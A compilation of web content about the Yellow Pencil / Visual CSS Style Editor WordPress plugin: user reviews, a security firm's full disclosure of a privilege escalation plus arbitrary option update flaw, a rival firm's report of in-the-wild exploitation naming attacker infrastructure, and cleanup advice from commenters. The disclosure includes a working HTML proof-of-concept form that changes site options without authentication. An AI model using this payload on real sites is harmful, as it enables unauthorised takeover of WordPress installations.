there is no free plugin, so buy one and try. If you are not satisfied, learn CSS yourself!

As a non programmer this had so much potential for me. However I couldn’t save things I wanted to do for FREE.
I wouldn’t have minded paying if it was a license for all my little websites and it wasn’t too expensive. Most of my sites are not for profit so I’m left behind to support the license on this product.

Do not even waste your time downloading it.I deleted it from all my 40 websites.I thought about purchase of the license but now I quit with it.Seems they have business getting worse and worse if they have to disable such an important feature.Absolutely useless plugin now.

One of the latest updates introduced a “new feature”. Now you can’t even copy your code from the editor without buying premium version. As a long time user of your plugin, that considered a premium subscription, I find this move a bit… pathetic, for the lack of a better word.This plugin in free version is now officially useless.

# Recently Closed Visual CSS Style Editor WordPress Plugin Contains Privilege Escalation Vulnerability That Leads to Option Update Vulnerability

When it comes to the security of WordPress plugins what other security companies generally do is to add protection against vulnerabilities after they have already been widely exploited, which obviously won’t produce great results since there is a good chance the websites using their service have already been hacked by the time they do that. One of the ways we keep ahead of that is to monitor the closure of the 1,000 most popular WordPress plugins in the Plugin Directory, since that closure can be due to a security issue and even if it is not, we have found the plugins being closed often contain security vulnerabilities, and as was the case with one less than two weeks ago, [ones likely to be exploited](https://www.pluginvulnerabilities.com/2019/03/30/wordpress-plugin-team-paints-target-on-exploitable-settings-change-vulnerability-that-permits-persistent-xss-in-related-posts/). Hackers seem to be doing that type of monitoring as well. Through that we found that the plugin [Visual CSS Style Editor](https://wordpress.org/plugins/yellow-pencil-visual-theme-customizer/), which has 30,000+ active installs and was closed yesterday, has two vulnerabilities that when combined lead to a type of vulnerability hackers would be likely to exploit.

When we started to do a quick check of the security of the plugin after we were notified by our monitoring that it was closed, we found that were multiple basic security failures. For example, our [Plugin Security Checker](https://www.pluginvulnerabilities.com/plugin-security-checker/), which is an automated tool anyone can use to check plugins for possible security issues, correctly identified the possibility of a reflected cross-site scripting (XSS) vulnerability. But that isn’t a serious issue, so we went to look if there was something more serious that we should be warning our customers about instead. We found something that fit the bill, but there could be other issues as well.

One of the more serious issues we ran across involves privilege escalation through a function we can’t recall, at least recently, being involved in any vulnerabilities, but it turns out to be very dangerous when combined with another vulnerability in the plugin. The plugin sets the function yp\_remote\_get\_first() to run whenever WordPress loads:

| ``` 2225  ``` | ``` add_action('init', 'yp_remote_get_first'); ``` |
| --- | --- |

add\_action('init', 'yp\_remote\_get\_first');

In that function if the GET input “yp\_remote\_get” exists then the [current user is set](https://developer.wordpress.org/reference/functions/wp_set_current_user/) to the user ID 1:

| ``` 2016 2017 2018 2019 2020 2021  ``` | ``` function yp_remote_get_first(){     if(isset($_GET["yp_remote_get"])){         wp_set_current_user(1);         show_admin_bar(false);     } } ``` |
| --- | --- |

function yp\_remote\_get\_first(){
if(isset($\_GET["yp\_remote\_get"])){
wp\_set\_current\_user(1);
show\_admin\_bar(false);
}
}

The implications of that are not all that clear from the documentation and that doesn’t log you in to WordPress, so it isn’t visually obvious what is going on, but what that can lead to can be seen with the next vulnerability. (Checking through WPDirectory we found a few other plugin also contain the line “[wp\_set\_current\_user(1)](https://wpdirectory.net/search/01D81HVV5AMRJE77G2CQR6DJ9M)“.)

The plugin registers the function yp\_option\_update() to run during admin\_init, which means it can run even when not logged in to WordPress:

| ``` 377  ``` | ``` add_action("admin_init","yp_option_update"); ``` |
| --- | --- |

add\_action("admin\_init","yp\_option\_update");

That function looks reasonably secure as it restricts access to its code to users with the “edit\_theme\_options” capability, which normally only Administrators have:

| ``` 316 317 318 319  ``` | ``` function yp_option_update(){   	// Can? 	if(current_user_can("edit_theme_options") == true){ ``` |
| --- | --- |

function yp\_option\_update(){
// Can?
if(current\_user\_can("edit\_theme\_options") == true){

But when you exploit the aforementioned privilege escalation vulnerability it will cause the request to be seen as coming from someone with that capability as long as the user with the ID 1 has that capability, which normally they would. Without that there is still a lack of protection against cross-site request forgery (CSRF), so there would have still been a vulnerability on its own.

The next code that runs takes user input in the form of the POST input “yp\_json\_import\_data” and passes it to the function yp\_import\_data():

| ``` 322 323 324 325 326 327 328  ``` | ``` 		if(isset($_POST['yp_json_import_data'])){   			$data = trim( strip_tags ( $_POST['yp_json_import_data'] ) );   			if(empty($data) == false){   				yp_import_data($data); ``` |
| --- | --- |

if(isset($\_POST['yp\_json\_import\_data'])){
$data = trim( strip\_tags ( $\_POST['yp\_json\_import\_data'] ) );
if(empty($data) == false){
yp\_import\_data($data);

That function using that user input to specify arbitrary WordPress options (settings) to update:

| ``` 3569 3570 3571 3572 3573 3574 3575 3576 3577 3578 3579 3580 3581 3582 3583 3584 3585 3586 3587 3588 3589 3590 3591 3592 3593 3594 3595 3596 3597  ``` | ``` function yp_import_data($json) {       $json = yp_stripslashes($json);       if (empty($json)) {         return false;     }       $array = json_decode($json, true);       foreach ($array as $nodes) {           foreach ($nodes as $key =&gt; $value) {               $value = yp_decode($value);               // If post meta             if (strstr($key, '._')) {                   $keyArray = explode(".", $key);                 $postID   = $keyArray[0];                 $metaKey  = $keyArray[1];                   if (!add_post_meta($postID, $metaKey, $value, true)) {                     update_post_meta($postID, $metaKey, $value);                 }               } else { // else option                 if (!update_option($key, $value)) { ``` |
| --- | --- |

function yp\_import\_data($json) {
$json = yp\_stripslashes($json);
if (empty($json)) {
return false;
}
$array = json\_decode($json, true);
foreach ($array as $nodes) {
foreach ($nodes as $key =&gt; $value) {
$value = yp\_decode($value);
// If post meta
if (strstr($key, '.\_')) {
$keyArray = explode(".", $key);
$postID = $keyArray[0];
$metaKey = $keyArray[1];
if (!add\_post\_meta($postID, $metaKey, $value, true)) {
update\_post\_meta($postID, $metaKey, $value);
}
} else { // else option
if (!update\_option($key, $value)) {

All that combined leads to an option update vulnerability, a type of vulnerability which has been a popular target for hackers recently, so we wouldn’t recommend having the plugin activated until that is fixed and the better recommendation is to not use this plugin until it has been more fully reviewed for security issues and all of those found, fixed. We [do just that sort of review](https://www.pluginvulnerabilities.com/wordpress-plugin-security-review-service/).

Due to the moderators of the WordPress Support Forum’s [continued](https://www.pluginvulnerabilities.com/2018/09/27/wordpress-team-didnt-notify-developer-of-plugin-with-700000-active-installations-about-vulnerability-they-knew-about/) [inappropriate](https://www.pluginvulnerabilities.com/2018/09/25/wordpress-support-forum-moderators-engaged-in-cover-up-of-security-issues-in-wordpress-plugins/)[behavior](https://www.pluginvulnerabilities.com/2018/09/25/wordpress-support-forum-moderators-stop-people-from-getting-help-so-they-can-promote-favored-security-companies/) we are [full disclosing vulnerabilities in protest until WordPress gets that situation cleaned up](https://www.pluginvulnerabilities.com/2018/09/25/our-new-disclosure-policy-in-response-to-the-continued-inappropriate-behavior-of-the-wordpress-support-forum-moderators/), so we are releasing this post and then only trying to notify the developer through the WordPress Support Forum. You can notify the developer of this issue on the forum as well. Hopefully the moderators will finally see the light and clean up their act soon, so these full disclosures will no longer be needed (we hope they end soon). You would think they would have already done that since multiple [previously full disclosed vulnerabilities](https://www.pluginvulnerabilities.com/2018/11/30/hackers-have-been-probing-for-usage-of-the-kiwi-social-share-wordpress-plugin-for-a-couple-of-weeks/)were [quickly on hackers’ radar](https://www.pluginvulnerabilities.com/2019/03/26/webarx-hides-that-their-firewall-failed-to-provide-same-protection-simply-updating-wordpress-plugin-would-have/), but it appears those moderators have such disdain for the rest of the WordPress community that their continued ability to act inappropriate is more important that what is best for the rest of the community.

## Proof of Concept

The following proof of concept will turn on user registration.

Make sure to replace “[path to WordPress]” with the location of WordPress.

```
<html>
<body>
<form action="http://[path to WordPress]/wp-admin/admin-post.php?yp_remote_get=test" method="POST">
<input type="hidden" name="yp_json_import_data" value='[{"users_can_register":"MQ=="}]' />
<input type="submit" value="Submit" />
</form>
</body>
</html>
```
## Is It Fixed?

If you are reading this post down the road the best way to find out if this vulnerability or other WordPress plugin vulnerabilities in plugins you use have been fixed is to sign up for [our service](https://www.pluginvulnerabilities.com/product/subscription/), since what we uniquely do when it comes to that type of data is to test to see if vulnerabilities have really been fixed. Relying on the developer’s information, can lead you astray, as we often find that they believe they have fixed vulnerabilities, but have failed to do that.

   1. Log into your WordPress database with phpMyAdmin through your hosting control panel.

   2. Navigate to the table wordpress\_options table

   3. Edit the first two rows “siteurl” and “home” back to your domain e.g. <https://website.com>

   4. Click on your database name in the left panel of phpMyAdmin and then click the Search button along the top bar and search all of your tables for the name of the malicious domain that your website was redirecting to with ‘ ’ either side e.g. %baddomain to find any remaining records.

# Zero-Day Vulnerability in Yellow Pencil Visual Theme Customizer Exploited in the Wild

On Monday the WordPress plugin Yellow Pencil Visual Theme Customizer was closed in the WordPress.org plugin repository. The plugin is quite popular, with an active install base of over 30,000 websites. On Tuesday a security researcher made the irresponsible and dangerous decision to publish a blog post including a proof of concept (POC) detailing how to exploit a set of two software vulnerabilities present in the plugin.

We are seeing a high volume of attempts to exploit this vulnerability. The exploits very closely resemble the POC posted by the irresponsible researcher.

We deployed a firewall rule to protect against these attacks yesterday, which our Premium customers have now received. All site owners are urged to remove the plugin from their sites immediately.

## Privilege Escalation Enables Arbitrary Options Updates

The first flaw that enables this attack is present in the `yellow-pencil.php` file within the plugin. The `yp_remote_get_first()` function is called on every page load and checks if a specific request parameter (`yp_remote_get`) has been set. If it has, the plugin escalates privileges to that of an administrator for the remainder of the request.

```
function yp_remote_get_first(){
     if(isset($_GET["yp_remote_get"])){
         wp_set_current_user(1);
         show_admin_bar(false);
     }
 }
```

This privilege escalation makes any user capabilities checks later in the plugin moot. As a result, unauthenticated users can perform actions, such as change arbitrary options, that were only meant for site administrators. A cross-site request forgery (CSRF) check is missing in the function below that would have made it much more difficult to exploit.

```
function yp_option_update(){

     // Can?
     if(current_user_can("edit_theme_options") == true){

         // Import the data
         if(isset($_POST['yp_json_import_data'])){

             $data = trim( strip_tags ( $_POST['yp_json_import_data'] ) );

             if(empty($data) == false){

                 yp_import_data($data);
```
## Familiar Threat Actor Strikes Again

We’re again seeing commonalities between these exploit attempts and attacks on recently discovered vulnerabilities in the Social Warfare, Easy WP SMTP and Yuzo Related Posts plugins. Exploits so far are using a malicious script hosted on a domain, `hellofromhony[.]com` , which resolves to `176.123.9[.]53`. That IP address was used in the other attacks mentioned. We are confident that all four attack campaigns are the work of the same threat actor.

## Conclusion

As continues to be the case, a disgruntled security researcher continues to put the WordPress community at risk by publicly disclosing POCs for zero-day vulnerabilities. In this environment we strongly recommend staying on top of WordPress security news and considering an upgrade to [Wordfence Premium](https://www.wordfence.com/wordfence-signup/).

Site owners running the [Yellow Pencil Visual Theme Customizer](https://wordpress.org/plugins/yellow-pencil-visual-theme-customizer/) plugin are urged to remove it from their sites immediately. Wordfence Premium customers received an updated firewall rule to protect against this vulnerability yesterday. Free users will receive it 30 days later.

  Thank you for this blog. I do not have this plugin, but have the problem on my https://lanupitan.com website. Is there any other help on how to get rid of it.

  If you have a similar issue on your site and you're not using Yellow Pencil Visual Theme Customizer, you might have another vulnerability on your site. I'd recommend having someone look at the actual redirect, review recent log files, and determine what may have happened. If you're unsure, you can leverage our site cleaning team who can assist. https://www.wordfence.com/wordfence-site-cleanings/ You can also review this guide to help you clean your hacked site. https://www.wordfence.com/docs/how-to-clean-a-hacked-wordpress-site-using-wordfence/

  If your website is currently being redirected, the vulnerability on your site has likely been exploited. We recommend restoring from a recent backup and removing the affected plugins, following this guide to clean your hacked site https://www.wordfence.com/docs/how-to-clean-a-hacked-wordpress-site-using-wordfence/, or reaching out to our security services team for assistance. https://www.wordfence.com/wordfence-site-cleanings/ There are other ways of applying CSS to your WordPress site beyond a plugin. https://www.wpbeginner.com/plugins/how-to-easily-add-custom-css-to-your-wordpress-site/

  One of my sites was struck by this two days ago. To get back to full functionality, I had to restore to a prior version of the database. That is, changes to files were not sufficient to undo the redirects that had been inserted. I just wanted to leave this note in case it helps others solve similar issues in the future.

  Please note, you can use phpmyadmin to access db and change sitename, siteurl back to normal and wp dashboard will be accessible for further urgent copy of code/files.

  That's because it will either change the site/home URL string in wp\_options or add serialized data containing javascript in wp\_options, or both, but either will cause the redirect to persist even after replacing all core files. Good troubleshooting and planning by having a backup handy :)

  In many cases the redirect is due to the siteurl and home values being changed in wp\_options (or whatever your table prefix is). There are some other plugins where this can be compromised too, such as the yuzo related posts plugin.
